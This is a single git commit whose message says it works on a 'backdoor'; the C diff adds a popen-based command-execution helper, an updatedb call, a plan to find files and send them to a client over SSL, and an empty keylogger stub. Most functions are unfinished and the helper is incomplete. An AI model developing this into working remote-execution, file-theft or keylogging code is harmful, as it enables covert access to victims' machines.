b9478b3e2b964ede6099000f8c00c3eb38004377
Luke Queenan <lukequeenan@gmail.com>
2012-11-15 15:34:57 -0800

    Working on functionality of the backdoor

--- src/functionality.c
+++ src/functionality.c
@@ -1,16 +1,50 @@
 #include "functionality.h"
 
+sendResult(char *result);
+
 void executeSystemCall(char *command)
 {
-    
 }
 
+/*
+ First run the system command "updatedb" to build the database of all files,
+ then run "locate FILENAME" and store the results in a buffer. Either we just
+ take the first result, or we iterrate through all the files listed? Either way
+ we open the file and send it back over to the client via SSL. Running this
+ command requires the popen command. Should make use of the executeSystemCall()
+ function.
+*/
 void retrieveFile(char *file)
 {
+    
+    // Update the database for locate
+    system("updatedb");
+    
     
 }
 
 void keylogger()
 {
     
+}
+
+char *executeHelper(char *command)
+{
+    char line[PATH_MAX];
+    FILE *results = NULL;
+    
+    // Execute and open the pipe for reading
+    results = popen(command, "r");
+    
+    // Make sure we have something yo
+    if (results == NULL)
+    {
+        return NULL;
+    }
+    
+    // Read from the stream
+    while (fgets(line, PATH_MAX, results) != NULL)
+    {
+        
+    }
 }
--- src/functionality.h
+++ src/functionality.h
@@ -1,6 +1,14 @@
 #ifndef FUNCTIONALITY_H
 #define FUNCTIONALITY_H
 
+#include <limits.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <openssl/crypto.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+
 void executeSystemCall(char *command);
 void retrieveFile(char *file);
 void keylogger();
